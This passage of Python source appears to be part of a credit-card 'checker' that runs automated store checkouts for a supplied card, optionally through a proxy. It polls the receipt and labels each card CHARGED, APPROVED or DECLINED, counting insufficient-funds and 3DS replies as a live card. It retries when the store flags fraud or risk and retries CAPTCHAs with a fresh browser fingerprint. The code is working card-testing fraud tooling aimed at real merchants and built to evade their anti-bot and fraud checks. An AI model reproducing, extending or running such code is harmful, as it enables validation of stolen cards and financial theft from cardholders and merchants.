            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("no receipt sessionToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 10: {e}")
            return result

        # Step 11 — poll with verified data extraction
        _delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        _type_re = re.compile(
            r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"'
        )

        for poll_num in range(1, 21):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_id, receipt_id, receipt_session_token)

                if detect_captcha_challenge(poll_body):
                    return _captcha_result(card_entry, shop_url, currency, "poll")

                rt = ""
                m = _type_re.search(poll_body)
                if m:
                    rt = m.group(1)
                result.status_code = extract_receipt_status_code(poll_body, rt)

                if rt in ("SuccessfulReceipt", "ProcessedReceipt"):
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"

                    # Verified data straight from the receipt
                    try:
                        receipt = json.loads(poll_body).get("data", {}).get("receipt", {}) or {}

                        amt, cur = extract_charged_amount_from_receipt(receipt)
                        if amt:
                            result.amount = amt
                        if cur:
                            result.currency = cur

                        oid = extract_order_id_from_receipt(receipt)
                        if oid:
                            result.order_id = oid

                        result.receipt_url = extract_receipt_url_from_receipt(
                            receipt, fallback=checkout_url)
                    except Exception:
                        result.receipt_url = result.receipt_url or checkout_url

                    return result

                if rt == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if rt == "FailedReceipt":
                    em = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    code = em.group(1) if em else ""

                    if "CAPTCHA" in code:
                        return _captcha_result(card_entry, shop_url, currency, "receipt")

                    if code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result

                    if code in ("CARD_DECLINED", "GENERIC_ERROR"):
                        result.status = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error = Exception(code or "CARD_DECLINED")
                        return result

                    if "InventoryReservationFailure" in poll_body:
                        result.retryable = True
                        result.error = Exception("inventory")
                        return result

                    site_sigs = ("fraud", "not supported", "brand", "suspected",
                                  "risk", "shipping", "artifact", "transformer",
                                  "not available", "cannot be placed")
                    if any(s in (code + " " + poll_body).lower() for s in site_sigs):
                        result.retryable = True
                        result.error = Exception(code)
                        return result

                    result.status = CheckStatus.DECLINED
                    result.error = Exception(code)
                    return result

                delay = 500
                m = _delay_re.search(poll_body)
                if m:
                    try:
                        d = int(m.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 3000) / 1000.0)

            except Exception as e:
                result.retryable = True
                result.error = Exception(f"poll {poll_num}: {e}")
                return result

        result.retryable = True
        result.error = Exception("exceeded 20 poll attempts")
        return result

    finally:
        client.close()


# ──────────────────────── Public entry ───────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str,
                           proxy_url: str = "", low: bool = True) -> CheckResult:
    max_retries = int(os.environ.get("CAPTCHA_RETRIES", "1"))
    last: Optional[CheckResult] = None

    for attempt in range(1 + max_retries):
        result = _run_checkout_internal(shop_url, card_entry, proxy_url, low)
        last = result

        if result.status_code != "CAPTCHA_REQUIRED":
            return result

        if attempt < max_retries:
            delay = 2.0 + random.random() * 3.0
            logger.info(
                "CAPTCHA detected (attempt %d/%d) — retrying with fresh fingerprint in %.1fs",
                attempt + 1, 1 + max_retries, delay)
            time.sleep(delay)

    return last
